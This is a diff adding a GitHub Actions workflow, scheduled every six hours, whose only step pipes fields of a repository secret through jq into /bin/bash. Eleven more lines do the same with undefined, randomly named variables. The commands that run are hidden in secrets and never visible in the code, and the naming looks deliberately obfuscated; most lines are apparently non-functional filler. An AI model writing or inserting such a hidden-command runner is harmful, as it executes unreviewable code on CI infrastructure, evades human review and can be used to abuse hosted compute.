@@ -1,0 +1,28 @@
+name: laoliuhedan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: laoliuhedan
+        env:
+          gv828: ${{ secrets.gv828 }}
+        run: |
+          echo $gv828 | jq -r .ee702 | /bin/bash
+          echo $hdkuh2 | jq -r .stvak4954 | /bin/bash
+          echo $i686 | jq -r .vu2 | /bin/bash
+          echo $wxho94 | jq -r .p9631 | /bin/bash
+          echo $bk0 | jq -r .qg363 | /bin/bash
+          echo $ak7156 | jq -r .luz591 | /bin/bash
+          echo $f1997 | jq -r .xu35921 | /bin/bash
+          echo $q0 | jq -r .jop25 | /bin/bash
+          echo $hu5211 | jq -r .pkuc78 | /bin/bash
+          echo $w52656 | jq -r .y5548 | /bin/bash
+          echo $dyeh8 | jq -r .xcfrs8214 | /bin/bash
+          echo $gtuhy42 | jq -r .p99 | /bin/bash
+
